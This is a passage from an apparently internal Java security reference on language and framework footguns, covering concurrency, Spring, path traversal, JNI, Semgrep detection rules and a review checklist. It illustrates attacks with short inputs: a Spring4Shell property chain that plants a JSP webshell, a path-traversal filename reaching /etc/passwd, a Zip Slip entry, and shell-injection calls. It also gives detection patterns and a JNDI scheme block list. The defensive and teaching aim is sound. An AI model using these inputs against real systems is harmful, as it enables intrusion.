`java.util.concurrent.ConcurrentHashMap`. The footgun: `HashMap` is the obvious `java.util`
choice and the developer must specifically know to reach into `java.util.concurrent`.
`LinkedHashMap`, `TreeMap`, `WeakHashMap` are also not thread-safe; only `ConcurrentSkipListMap`
exists in `j.u.c.` as a sorted-map alternative.

### Double-checked locking and `volatile`

Classic DCL is broken without `volatile`:

```java
private SingletonHelper instance;   // missing volatile

public SingletonHelper get() {
    if (instance == null) {
        synchronized (this) {
            if (instance == null) instance = new SingletonHelper();
        }
    }
    return instance;
}
```

The JMM permits the compiler to reorder the construction; readers may observe
`instance != null` but a partially-constructed object. Fix: `private volatile`. The 2004 JMM
revision (JSR-133, Lea + Pugh) defined the modern happens-before semantics that make
`volatile` work for object references.

### The Java Memory Model — happens-before

The JMM defines when one thread's write becomes visible to another's read; default is "no
guarantee" unless an explicit happens-before edge is established (volatile writes,
synchronized exit, `Thread.start`, `Thread.join`, final-field freeze, `j.u.c.` primitives).
Without an explicit edge, a write can be perpetually invisible to another thread. This is "I
forgot to think about visibility" — the most common Java concurrency bug after lock
contention. Goetz's *JCiP* §3.1 ("Visibility") is the canonical exposition.

### `Thread.stop()` — deprecated and corrupting

`Thread.stop()` throws `ThreadDeath` at an arbitrary point in the target thread, including
mid-`synchronized`-block. Locks are released but intermediate state is exposed half-finished.
Replacement: `Thread.interrupt()` plus cooperative shutdown via `isInterrupted()`. JEP 462 /
JEP 491 (JDK 21+) finalize the deprecation by removing `Thread.stop` entirely.

### `ThreadLocal` leaks in pooled threads

`ThreadLocal<T>` associates a value with a thread. In a thread-pool (servlet container, etc.)
threads don't terminate — they handle one request, return to the pool, and pick up the next. A
`ThreadLocal` set during request N is still set during request N+1. Produces memory leaks
(value held by thread reference) and **security leaks** (request N's
`ThreadLocal<UserContext>` visible to N+1 if N+1's handler reads before setting). Discipline:
every `ThreadLocal.set` in a pooled-thread context needs a matching `ThreadLocal.remove` in
`finally`. Better: use a request-scoped DI container.

### `ForkJoinPool` + work-stealing deadlock

`ForkJoinPool` underlies `parallelStream()` and `CompletableFuture.runAsync()` (default common
pool size = available processors - 1). Failure modes: (1) blocking calls in the common pool
collapse `parallelStream` throughput; (2) recursive task dependencies (A waits for B, B queued
behind A on same worker's deque) deadlock the work-stealing scheduler. Defense: never block in
`parallelStream` lambdas; use `ForkJoinTask.compute()` / `invokeAll` for recursive cases.

### Virtual threads (JEP 444, JDK 21)

Virtual-thread footguns: (1) **pinning** — a virtual thread holding `synchronized` and
blocking on I/O monopolizes its carrier thread; density of pinning collapses throughput. Use
`ReentrantLock` instead of `synchronized` in virtual-thread codepaths. (2) **Unconditional
daemon** — virtual threads won't prevent JVM exit; platform-thread shutdown-ordering code
breaks silently. (3) **Fixed priority** — `Thread.setPriority` is a no-op; QoS-by-priority
breaks silently. (4) **`ThreadLocal` cost** — high-frequency `set` in virtual-thread code has
different cost characteristics. Source: `openjdk.org/jeps/444`.

### Cross-link

For race conditions, TOCTOU, and the broader concurrency-vulnerability taxonomy, see
`race_conditions_concurrency_expertise.md`.

---

## 10. Spring / Spring Boot — Framework-Specific Footguns

### `@RequestParam` + `@PathVariable` and the binding surface

Spring MVC binds request parameters to controller-method arguments via a `DataBinder`. The
binder uses Java Bean conventions: a request parameter named `user.name` binds to
`getUser().setName(...)`. The binding is *recursive*: nested properties are reachable through
path expressions.

This is convenient and a footgun. Any property that's reachable from the controller method's
bound object — through getters, then setters, then more getters — is settable by the attacker.
The fix in pre-Spring4Shell defenses was `DataBinder.setDisallowedFields(...)` to
explicitly blacklist sensitive properties.

### Spring4Shell (CVE-2022-22965)

In JDK 9+, `Class` acquired a `getModule()` method returning a `Module`. The chain
`class.module.classLoader` thus became reachable through Spring's bean property navigation.
An HTTP request with parameters like
`class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp` (plus
directory, prefix, fileDateFormat) reconfigures Tomcat's `AccessLogValve` to write a JSP
webshell to the web root. The next request to that JSP executes the webshell. The fix in
Spring 5.3.18 / 5.2.20 explicitly blacklists `class.*` paths in the binder — the underlying
footgun (data binder follows arbitrary property paths) remains; the patch is a denylist.
Source: `nvd.nist.gov/vuln/detail/CVE-2022-22965`,
`jfrog.com/blog/springshell-zero-day-vulnerability-all-you-need-to-know/`.

### SpEL injection in Spring annotations

```java
@PreAuthorize("hasRole(#userInput)")               // safe — bound, not eval'd
@PreAuthorize("hasRole('" + userInput + "')")      // CVE — concatenation into SpEL
```

`@PreAuthorize` accepts a SpEL string with `#paramName` substitution. Concatenating user input
into the annotation value (dynamic configuration, reflection-driven annotation construction)
is SpEL injection. Same pattern: `@PostAuthorize`, `@PreFilter`, `@PostFilter`,
`@Value("#{...}")`, `@Cacheable(condition=...)`. Any SpEL string built from user input is a
CVE candidate.

### Actuator endpoints — pre-2.0 default

Spring Boot Actuator pre-2.0 exposed `/env`, `/heapdump`, `/trace`, `/loggers`, others
unauthenticated by default. `/env` returns environment variables (often database passwords);
`/heapdump` dumps the JVM heap; `/jolokia` (when bundled) was the JMX-over-HTTP gadget. Spring
Boot 2.x defaults changed: only `/health` and `/info` are exposed without authentication.
Legacy 1.x deployments retain the footgun. Cross-link to `distributed_authz_expertise.md` for
the broader "internal endpoint exposed externally" failure mode.

### Spring Security configuration ordering

Spring Security's filter chain is order-sensitive. `addFilterBefore`, `addFilterAfter`,
`addFilterAt` interact with the default chain in subtle ways. Common misorderings: filters
that should run after auth see unauthenticated principals; broad `permitAll()` matchers
evaluated after stricter ones; custom-filter exceptions escaping an upstream
`ExceptionTranslationFilter` because the custom filter is positioned downstream. Spring
Security 6.x simplified the API but the underlying footgun (filter-chain ordering is load-
bearing for authorization correctness) remains.

---

## 11. File I/O and Path Traversal

### The naive concatenation footgun

```java
File f = new File("/var/www/uploads/" + request.getParameter("filename"));
```

`filename=../../../etc/passwd` → `/etc/passwd`. Java filesystem APIs have no automatic
canonicalization or containment check. Defense: `resolve` then `normalize` then `startsWith`
against the canonicalized base path. Skipping any step produces a bypass.

### Symbolic link following

Java's default file operations follow symlinks. Attacker symlinks in writable directories
(`/tmp`, user-upload directories) defeat path checks. `Files.copy(src, dst,
LinkOption.NOFOLLOW_LINKS)` opts out; developer must remember `NOFOLLOW_LINKS` every time.
Cross-link to `code_review_expertise.md` §4 ("Absolute path handling is always suspicious").

### Zip Slip (CVE-2018 corpus)

`ZipInputStream.getNextEntry().getName()` returns the entry's path as stored. An archive with
`../../../tmp/evil.sh` extracted naively writes outside `targetDir`. Snyk's 2018 Zip Slip
research catalogued thousands of vulnerable Java projects (AWS CodePipeline, Spring
Integration, LinkedIn Pinot, Heron, Alibaba JStorm, Jenkins, Gradle). Same vulnerability class
applies to `tar`, `jar`, `war`, `cpio`, `apk`, `rar`, `7z`. Defense:

```java
String canonicalDir = targetDir.getCanonicalPath();
String canonicalOut = new File(targetDir, entry.getName()).getCanonicalPath();
if (!canonicalOut.startsWith(canonicalDir + File.separator)) {
    throw new SecurityException("zip slip");
}
```

The `File.separator` suffix is load-bearing: without it, `/foo` would pass against `/foobar`.

### `Path.resolve` discipline

`Path.resolve(other)` is *not* a containment operation. If `other` is absolute,
`resolve(other)` returns `other` (base discarded). If `other` is `../etc/passwd`, `resolve` +
`normalize()` traverses outside the base. The full safe pattern:

```java
Path base = Paths.get("/var/www/uploads").toRealPath();   // canonicalize base
Path candidate = base.resolve(userInput).normalize();
if (!candidate.startsWith(base)) { ... }                  // containment check
```

`toRealPath()` resolves symlinks in the base; without it, symlink manipulation in the parent
directories bypasses containment.

### Argv injection in `ProcessBuilder` and `Runtime.exec`

```java
Runtime.getRuntime().exec("ls " + userInput);
```

This is the classical shell-injection primitive. The string is tokenized by `StringTokenizer`
(in `Runtime.exec(String)`) or shell-expanded if the developer wraps it in `sh -c`. Either way,
attacker-controlled metacharacters produce arbitrary command execution.

`ProcessBuilder` with an array argument avoids shell metacharacter interpretation:

```java
new ProcessBuilder("ls", userInput).start();
```

But it does not avoid argv injection: if the binary being invoked interprets one of its argv
elements as an option flag (e.g., `find -exec ...`, `tar --to-command ...`), attacker control
over that argv element produces a different RCE class. The composer CVE-2022-24828 example
(from `feedback_escapeshellcmd_weak_sanitizer`) shows this in PHP, but the Java equivalent
exists for any tool that has dangerous option flags.

Cross-link to `shell_injection_expertise.md` for the cross-language taxonomy.

---

## 12. Memory and Native Interop

### `ByteBuffer.allocateDirect` and native-memory leaks

`ByteBuffer.allocateDirect(int capacity)` allocates off-heap memory backed by the OS. Direct
buffers bypass the GC heap and are collected by `Cleaner` references that the GC schedules
opportunistically. Long-running services that allocate direct buffers without explicit
lifecycle management can exhaust process memory even when the GC heap is healthy. The footgun:
`OutOfMemoryError: Direct buffer memory` looks like a GC problem but is actually a leaks-
the-OS-process problem. Defense: use `ByteBuffer.allocate` (heap-backed) unless direct buffers
are required; when they are, use a pool (Netty's `PooledByteBufAllocator`).

### JNI — the "native code crashes JVM" reality

JNI lets Java call C/C++ functions, with effectively no JVM constraint on what the native code
does. Stale `jobject` references produce JVM crashes with no Java stack trace. Missing
`NewGlobalRef` across JNI calls produces use-after-free when GC moves the underlying object.
`JNIEnv->ThrowNew` without immediate return produces undefined behavior — the exception is
queued but the C code continues executing, which can corrupt the JVM. The JVM's safety
guarantees end at the JNI boundary. Security-relevant code in a JNI library must be audited as
C/C++ code, not Java.

JEP 454 (Foreign Function & Memory API, JDK 22) is the long-term replacement, moving native
interop into the Java type system with bounds-checked memory access.

### `sun.misc.Unsafe` — see §5

`Unsafe.allocateInstance(Class)` constructs an object without invoking its constructor — the
same primitive Java Serialization uses internally. Direct application use of `Unsafe` is
deprecated by JEP 471.

### Garbage-collector behavior

For security-relevant code, do not assume any specific GC. Anything that depends on GC timing
(race conditions involving finalization, weak-reference-based authorization, "the password is
GC'd within N ms") is broken under one or more of G1, ZGC, or Shenandoah. Each GC has its own
relocation and reference-barrier semantics; cross-GC portability is not a security property.

---

## 13. Detection Patterns (Semgrep)

### Pattern catalog

The following Semgrep patterns capture the high-value footguns above. Each is the start of a
rule; production rules need scope filters, taint sources, and metadata. Cross-link
`semgrep_rule_authoring.md` for rule-design discipline.

**`ObjectInputStream` without filter:**
```yaml
patterns:
  - pattern: new ObjectInputStream($STREAM)
  - pattern-not-inside: |
      ($S = new ObjectInputStream($STREAM); $S.setObjectInputFilter($F); ...)
```

**`Class.forName` with non-literal name:**
```yaml
patterns:
  - pattern: Class.forName($X)
  - pattern-not: Class.forName("...")
```

**`Method.invoke` with non-literal method:**
```yaml
patterns:
  - pattern: $METHOD.invoke($TARGET, ...)
  - pattern-not-inside: |
      Method $METHOD = $C.getDeclaredMethod("...", ...); ...
```

**`Context.lookup` with non-literal name:**
```yaml
patterns:
  - pattern: $CTX.lookup($X)
  - pattern-not: $CTX.lookup("...")
```

**`ScriptEngine.eval` with non-literal:**
```yaml
patterns:
  - pattern: $ENGINE.eval($X)
  - pattern-not: $ENGINE.eval("...")
```

**Weak digest / cipher instantiation:**
```yaml
pattern-either:
  - pattern: MessageDigest.getInstance("MD5")
  - pattern: MessageDigest.getInstance("SHA-1")
  - pattern: MessageDigest.getInstance("SHA1")
  - pattern: Cipher.getInstance("AES")
  - pattern: Cipher.getInstance("DES")
```
(Context-narrowing is essential; non-security uses of MD5 are legitimate.)

**`Random` in security context:**
```yaml
patterns:
  - pattern: new Random(...)
  - metavariable-pattern:
      metavariable: $TOKEN
      patterns:
        - pattern-regex: "(?i)(token|nonce|secret|password|key|session|csrf)"
```

**`DocumentBuilderFactory` without `disallow-doctype-decl`** and **`ZipEntry.getName()`
without containment check** follow the same pattern-not-inside structure: assert the
hardening / containment block is present in the enclosing scope.

### Existing scanner coverage

- **CodeQL Java security pack** (GHSL, Muñoz et al.) — Java Serialization, JNDI, XXE, SpEL,
  OGNL, path traversal. `github.com/github/codeql/tree/main/java/ql/src/Security`.
- **SpotBugs Find Security Bugs** — bytecode-aware (catches reflection patterns).
  `find-sec-bugs.github.io`.
- **Trail of Bits Semgrep ruleset** — Temurin audit team open-sourced.
  `github.com/trailofbits/semgrep-rules`.
- **OWASP Dependency-Check** — flags vulnerable transitive dependencies. Critical for the
  "gadget on the classpath" problem.

### Combining static + dependency analysis

The Java footgun landscape requires both: static analysis finds the sink (`ObjectInputStream`,
`Class.forName`, `eval`); dependency analysis finds the gadget (Commons Collections, SnakeYAML
pre-2.0, Spring < 5.3.18). A sink without a classpath gadget is harder to exploit but still
viable via JDK-only gadgets. A gadget without an application sink is inert until a transitive
dependency adds one. The intersection is where CVEs live.

---

## 14. Defensive Patterns and Code Review Checklist

### 14-item Java code-review checklist

1. **Serialization sinks.** Grep `ObjectInputStream`, `readObject`, `readUnshared`. Any call
   without `ObjectInputFilter` is a CVE candidate. Prefer removing the sink.
2. **Polymorphic JSON.** Grep `enableDefaultTyping`, `@JsonTypeInfo`, `activateDefaultTyping`.
   Verify `PolymorphicTypeValidator` allowlist. Audit for Fastjson < 1.2.83.
3. **SnakeYAML.** Grep `new Yaml()` without `SafeConstructor`. Confirm SnakeYAML 2.0+.
4. **JNDI.** Grep `Context.lookup`, `InitialContext.lookup`, `InitialDirContext.lookup`.
   Confirm compile-time constants. Block `ldap://`, `rmi://`, `iiop://`, `dns://` in validators.
5. **Reflection.** Grep `Class.forName(`, `getDeclaredMethod(`, `Method.invoke(`. Confirm
   compile-time constants where attacker influence is possible.
6. **Eval engines.** Grep `eval(`, `parseExpression(`, `OgnlUtil`, `MVEL.eval(`, `JexlEngine`,
   `SpelExpressionParser`. Reject user-influenced eval targets.
7. **XML parsers.** Grep `DocumentBuilderFactory.newInstance`, `SAXParserFactory.newInstance`,
   `XMLInputFactory.newInstance`, `TransformerFactory.newInstance`. Confirm OWASP XXE-hardening
   (disallow-doctype-decl, external-general-entities=false).
8. **Crypto.** Grep `Cipher.getInstance("AES")` (no mode), `getInstance("DES"`,
   `getInstance("MD5"`, `getInstance("SHA-1"`, `new Random()` in security contexts.
9. **Spring data binding.** Verify Spring 5.3.18+/5.2.20+ patches. Audit `DataBinder` for
   `setDisallowedFields("class.*")`.
10. **Spring expression annotations.** Audit `@PreAuthorize`/`@PostAuthorize`/`@PreFilter`/
    `@PostFilter`/`@Cacheable(condition=...)`/`@Value("#{...}")` for user-input concatenation.
11. **Path traversal.** Grep `new File(BASE, USER_INPUT)`, `Paths.get(BASE).resolve(USER_INPUT)`.
    Confirm `canonicalize + startsWith` containment.
12. **Zip slip.** Grep `ZipEntry.getName()`. Confirm `canonicalize + startsWith(base +
    separator)` extraction pattern.
13. **Process invocation.** Grep `Runtime.exec(`, `ProcessBuilder(`. Use array-form; audit
    invoked binaries for dangerous option flags (`find -exec`, `tar --to-command`, etc.).
14. **Concurrency.** Grep `synchronized (this)`, `new HashMap` in shared state, `Thread.stop`,
    `ThreadLocal.set` without `remove`. Verify `volatile` on double-checked-lock fields.

### "Start here" search patterns

The single highest-value grep for a quick audit:

```
git grep -nE "readObject|Class\.forName|JNDI|setAccessible|ScriptEngine|eval|getInstance\(\"(AES|MD5|SHA-1|SHA1|DES)\"|new Random\("
```

This is the "is this codebase even possible to harden in one sprint" signal. Hundreds of
matches in a large enterprise Java codebase means the answer is no; remediation is a multi-
quarter program. A handful of matches in a focused service means the answer is yes.

Cross-link to `code_review_expertise.md` §3 ("Heterogeneous auth in single control
abstraction") and §6 ("Serialization with type handling is suspicious") for the methodology.

### Architectural defenses

1. **Don't deserialize untrusted data.** The only sound defense for `ObjectInputStream`. Switch
   to a schema-validated format (Protocol Buffers, Cap'n Proto, or Jackson with
   `PolymorphicTypeValidator` allowlist) that doesn't invoke arbitrary constructors during parse.
2. **HMAC-authenticate serialized blobs.** For application-internal data (cookies, cache keys,
   queue messages), sign with HMAC-SHA-256 and verify before deserializing. Converts
   deserialization-RCE to key-extraction-RCE.
3. **Network-layer filters.** Block `ldap://`, `rmi://`, `iiop://`, `dns://` egress from
   services that don't need them. Converts JNDI-RCE to JNDI-DoS.
4. **Classpath minimization.** Each dependency is a gadget surface. Tools: `jdeps`, OWASP
   Dependency-Check, Sonatype Lifecycle.
5. **JPMS strong encapsulation.** JDK 9+ `module-info.java` restricts reflection into
   unexported packages — makes reflection-based gadgets harder.
6. **Continuous CVE monitoring.** Subscribe to GHSL, Snyk, Spring Security advisories, Apache
   announce lists. Patch RCE-class CVEs within 7 days.

---

## 15. Variant Analysis — Under-Explored

This section catalogs Java primitives where the existing research is thin and the next
round of security research is likely to surface CVEs.

### Records (JEP 395, JDK 16+) and serialization

Records auto-implement `Serializable` deterministically: the canonical constructor reconstructs
the record from serialized state components. Records cannot define `readObject`, `writeObject`,
`readObjectNoData`, `readExternal`, or `writeExternal` — the magic-method gadget surface is
absent. The gadget surface reduces from "any `readObject` on any reachable class" to "any
canonical constructor that performs a security-relevant operation." Records used as data
carriers (no constructor side effects) are essentially safe to serialize.

Under-explored: what records-with-side-effect-constructors exist in widely-deployed libraries?
Any record whose canonical constructor calls a setter, performs I/O, or validates against
external state is a candidate gadget. Expect 2026-2028 to surface the first record-based
chains. Source: `openjdk.org/jeps/395`.

### Sealed classes (JEP 409, JDK 17+) and pattern matching

Sealed classes restrict which classes can extend or implement them: `sealed interface Shape
permits Circle, Square, Triangle`. This interacts with polymorphic deserialization — if
Jackson's `PolymorphicTypeValidator` accepts any subtype of `Shape`, the sealed constraint
bounds attacker-reachable types to the permitted set. A structural improvement for allowlist
design: code authors get a language-enforced allowlist for free. Under-explored: does adding a
`permits` clause to a long-deployed interface produce a silent change in deserialization
behavior?

### Project Loom (virtual threads) — concurrency rewrite

JEP 444 (JDK 21) finalized virtual threads. Under-explored security questions:

1. Does `ThreadLocal` leak between virtual threads in ways platform-thread audits missed? The
   virtual-thread leak surface is much larger because there are vastly more virtual threads
   than platform threads in a typical Loom-converted service.
2. Are `synchronized`-block pinning incidents observable as a side channel? Attacker-
   influenced workloads that cause pinning could fingerprint carrier-thread topology.
3. Does `StructuredTaskScope` (JEP 462, preview) introduce auth-context propagation footguns?
   Structured concurrency promises child tasks inherit parent context, but propagation
   discipline for `SecurityContext` / `RequestContextHolder` is library-specific.

### JEP 471 sealing `sun.misc.Unsafe` — post-2025 landscape

JEP 471 phases out `sun.misc.Unsafe` with VarHandle + FFM as migration targets. Under-
explored: what gadget chains relied on `Unsafe.allocateInstance` (constructor-bypass) for
their terminal primitive? The transitional period (JDK 23-26) is a research opportunity as
libraries migrate and gadget chains either break or move to new primitives.

### JEP 486 — permanently disabled Security Manager

The Security Manager API has no operational effect post-JDK 24. Under-explored: what code
paths in widely-deployed libraries relied on `System.getSecurityManager()` returning non-null
to gate dangerous operations? Those gates are now silently no-ops. Any "the security manager
will catch this" defensive assumption in legacy code is gone. Source: `openjdk.org/jeps/486`.

### GraalVM native-image and reachability metadata

GraalVM's native-image AOT compiler requires reachability metadata (`reflect-config.json`,
`resource-config.json`, `jni-config.json`) listing every class reachable via reflection. The
metadata file is typically generated by a tracing agent and committed to the repository,
making it a supply-chain artifact. A malicious test that triggers reflection on an attacker-
chosen class adds that class to the metadata and expands the gadget surface of the compiled
binary. Future research is likely to surface "supply-chain attack via reachability metadata"
as a distinct threat class.

---

## 16. References

### Foundational research

- AppSecCali 2015 "Marshalling Pickles" (Frohoff + Lawrence):
  `frohoff.github.io/appseccali-marshalling-pickles/`,
  `youtube.com/watch?v=KSA7vUkXGSg`
- ysoserial (Frohoff): `github.com/frohoff/ysoserial`
- "Java Unmarshaller Security" (Bechler, 2017):
  `raw.githubusercontent.com/mbechler/marshalsec/master/marshalsec.pdf`,
  `github.com/mbechler/marshalsec`
- Black Hat USA 2016 "A Journey from JNDI/LDAP Manipulation to RCE" (Muñoz + Mirosh):
  `speakerdeck.com/pwntester/ldap-manipulation-to-remote-code-execution-dream-land`
- Black Hat USA 2017 "Friday the 13th: JSON Attacks" (Muñoz + Mirosh):
  `blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf`
- CODE WHITE blog (Wulftange et al.): `codewhitesec.blogspot.com`,
  `code-white.com/credits/markus-wulftange/`

### Concurrency and JMM

- *Java Concurrency in Practice* (Goetz + Peierls + Bloch + Bowbeer + Holmes + Lea, 2006):
  `jcip.net`
- JSR-166 (Lea): `gee.cs.oswego.edu/dl/concurrency-interest/`,
  `jcp.org/ja/jsr/detail?id=166`
- JSR-133 Java Memory Model — the 2004 happens-before revision (Lea + Pugh).

### OpenJDK Enhancement Proposals (security-relevant)

JEP 290 (serialization filter), 395 (records), 409 (sealed classes), 411 (deprecate Security
Manager), 415 (context-specific filters), 444 (virtual threads), 454 (FFM API), 471
(deprecate `sun.misc.Unsafe` memory methods), 486 (permanently disable Security Manager), 498
(warn on Unsafe). All at `openjdk.org/jeps/<number>`.

### Incident timelines and advisories

- Log4Shell (CVE-2021-44228): `huntress.com/threat-library/vulnerabilities/cve-2021-44228`,
  `blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/`,
  `unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/`
- Spring4Shell (CVE-2022-22965): `nvd.nist.gov/vuln/detail/cve-2022-22965`,
  `jfrog.com/blog/springshell-zero-day-vulnerability-all-you-need-to-know/`
- Spring Cloud SpEL (CVE-2022-22963): `spring.io/security/cve-2022-22963/`,
  `akamai.com/blog/security/spring-cloud-function`
- SnakeYAML (CVE-2022-1471): `snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/`,
  `github.com/advisories/GHSA-mjmj-j48q-9wg2`,
  `veracode.com/blog/resolving-cve-2022-1471-snakeyaml-20-release-0/`
- Apache Commons Collections (CVE-2015-7501):
  `github.com/advisories/GHSA-fjq5-5j5f-mvxh`
- Struts2 OGNL (CVE-2024-53677):
  `dynatrace.com/news/blog/the-anatomy-of-broken-apache-struts-2-a-technical-deep-dive-into-cve-2024-53677/`,
  `github.com/EQSTLab/CVE-2024-53677`

### Tooling, OWASP, audit corpora

- OWASP XXE Cheat Sheet:
  `cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html`
- OWASP Deserialization Cheat Sheet:
  `cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html`
- CodeQL Java security queries: `github.com/github/codeql/tree/main/java/ql/src/Security`
- SpotBugs Find Security Bugs: `find-sec-bugs.github.io`
- Trail of Bits Semgrep rules + publications: `github.com/trailofbits/semgrep-rules`,
  `github.com/trailofbits/publications`
- OWASP Dependency-Check: `owasp.org/www-project-dependency-check/`
- PayloadsAllTheThings Java deserialization:
  `github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Java.md`
- Temurin audit (Trail of Bits + OSTIF + Eclipse Foundation):
  `ostif.org/temurin-audit-complete/`
- GitHub Security Lab research: `securitylab.github.com/research/`
- Jackson polymorphic deserialization wiki:
  `github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization`
- "Jackson 2.10: Safe Default Typing" (Saloranta / @cowtowncoder):
  `cowtowncoder.medium.com/jackson-2-10-safe-default-typing-2d018f0ce2ba`
- Snyk Zip Slip research: `security.snyk.io/research/zip-slip-vulnerability`

### Cross-language deserialization

For non-Java deserialization (Python pickle, .NET BinaryFormatter, Ruby Marshal, PHP
unserialize, ML pickle), the canonical home is `deserialization_expertise.md`. This Java
footgun doc focuses on Java-language-internal primitive defaults.

---

## End notes

This doc opens the "language-specific behavioral footgun" subclass of the expertise tree. The
footgun lens forces attention on what the language guarantees by default versus what it
requires the developer to opt into — a more directly actionable framing for code review than
the bug-class lens alone. Follow-on docs in this subclass (Python, JavaScript, Go, C#, PHP,
Rust) should preserve the structural commitments: verified-researcher bio block, numbered
technique sections, detection patterns, defensive checklist, variant analysis, references.
The lens is "primitives unsafe by default" not "bug classes that appear in this language."
